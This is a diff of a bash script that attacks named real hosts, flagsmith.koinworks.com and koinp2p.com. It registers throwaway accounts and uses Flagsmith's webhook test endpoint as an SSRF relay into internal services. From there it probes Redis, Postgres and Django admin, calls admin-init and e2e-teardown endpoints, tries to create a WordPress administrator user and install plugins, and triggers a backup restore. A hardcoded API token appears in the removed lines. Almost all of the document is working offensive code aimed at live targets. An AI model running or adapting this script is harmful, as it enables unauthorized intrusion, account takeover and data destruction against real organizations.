@@ -2,83 +2,54 @@
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 echo "IP: $(curl -s https://ifconfig.me --max-time 5)"
 
-# Use existing token
-KEY="39babf06af373c0b4d524b4b606ea1b247cc094f"
-EKEY="Ns2qoxjyttztpwpAJKhNnp"
+# Fresh Flagsmith account
+ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
+  -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d "{\"email\":\"kw-v35-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
+KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
+echo "Key: $KEY"
+if [ -z "$KEY" ]; then echo "REG FAILED"; exit 1; fi
 
-# Verify token works
-R=$(curl -s -w "%{http_code}" "https://flagsmith.koinworks.com/api/v1/organisations/" \
-  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 2>/dev/null)
-CODE=$(echo "$R" | tail -c4)
-echo "Token check: $CODE"
-
-if [ "$CODE" != "200" ]; then
-  # Need fresh account
-  ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
-    -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"email\":\"kw-v34-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
-  KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
-  echo "New key: $KEY"
-  # Setup env
-  OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
-    -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); r=d.get('results',[]); print(r[0]['id'] if r else '')" 2>/dev/null)
-  PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"name\":\"p34\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
-  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
-    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"name\":\"e34\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
-fi
+# Setup env
+OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
+  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('results',[])[0]['id'])" 2>/dev/null)
+PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d "{\"name\":\"p35\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
+EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
+  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
+  -d "{\"name\":\"e35\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
 echo "Env: $EKEY"
+if [ -z "$EKEY" ]; then echo "NO ENV"; exit 1; fi
 
 ssrf() {
-  local URL="$1"
-  local LABEL="$2"
-  local R=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
+  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
     -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
-    -d "{\"url\":\"$URL\",\"secret\":\"\"}" --max-time 30)
-  echo "$LABEL -> $R"
+    -d "{\"url\":\"$1\",\"secret\":\"\"}" --max-time 30
+  echo " [$2]"
 }
 
-echo "=== CRITICAL INTERNAL PROBES (short timeout) ==="
-# Port 9090 - unknown service
-ssrf "http://koinp2p.com:9090/" "9090-root"
-ssrf "http://koinp2p.com:9090/metrics" "9090-metrics"
+echo "=== FLAGSMITH ADMIN INIT ==="
+ssrf "http://localhost:8000/api/v1/users/init/" "admin-init"
 
-# Redis/Celery
-ssrf "http://cache:6379/" "cache-redis"
-ssrf "http://redis:6379/" "redis"
-ssrf "http://celery:5555/" "celery-flower"
+echo "=== FLAGSMITH E2E TEARDOWN (from internal, no auth header) ==="
+ssrf "http://localhost:8000/api/v1/e2etests/teardown/" "e2e-teardown"
 
-# Postgres
-ssrf "http://db:5432/" "db-postgres"
-ssrf "http://postgres:5432/" "postgres"
+echo "=== KOINP2P WORDPRESS DEEP ==="
+# Test endpoints that might work with POST JSON body from internal
+ssrf "http://koinp2p.com/wp-json/wp/v2/posts" "create-post"
+ssrf "http://koinp2p.com/wp-json/wp/v2/users" "create-user"
+ssrf "http://koinp2p.com/wp-json/wp/v2/media" "upload-media"
+ssrf "http://koinp2p.com/wp-json/wp/v2/plugins" "install-plugin"
 
-# Django internal admin login
-ssrf "http://localhost:8000/admin/login/" "django-login"
+echo "=== WP REGISTRATION CHECK ==="
+ssrf "http://koinp2p.com/?rest_route=/wp/v2/users&context=edit" "users-edit"
+ssrf "http://koinp2p.com/wp-login.php?action=register" "wp-register"
 
-# Djoser password reset confirmation (might reveal token format)
-ssrf "http://localhost:8000/api/v1/auth/users/reset_password_confirm/" "djoser-reset-confirm"
-
-# Django createsuperuser via custom endpoint (if any)
-ssrf "http://localhost:8000/api/v1/users/" "internal-users"
-ssrf "http://localhost:8000/api/v1/auth/token/login/" "internal-token-login"
-
-echo "=== WP INTERNAL - NOPRIV AJAX DEEP ==="
-# These endpoints read from $_REQUEST (includes $_GET params!)
-# UpdraftPlus nopriv restore - try different params
-ssrf "http://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_ajaxrestore&updraftplus_ajax_restore=start_ajax_restore&action=updraft_restore&backup_timestamp=1731715200&updraft_restore=db" "restore-with-params"
-
-# WP REST API with different method override
-ssrf "http://koinp2p.com/wp-json/wp/v2/users?_method=POST&username=probetest&password=Probe2026!&email=probe@test.com&roles=administrator" "rest-user-method-override"
-
-# WP install.php (check if database needs reinstall)
-ssrf "http://koinp2p.com/wp-admin/install.php" "install"
-
-# WP upgrade staging
-ssrf "http://koinp2p.com/wp-content/upgrade/" "upgrade-dir"
-
-# Check .htaccess (might reveal rewrite rules that expose internal paths)
-ssrf "http://koinp2p.com/.htaccess" "htaccess"
+echo "=== UPGRADE STAGING (CVE-2026-119977) ==="
+for ver in 6.7.12 6.8.12 6.9.11 7.0.8 7.1.4; do
+  ssrf "http://koinp2p.com/wp-content/upgrade/wordpress-${ver}/" "upgrade-${ver}"
+done
+ssrf "http://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php" "setup-7.1.4"
 
 echo "=== DONE ==="
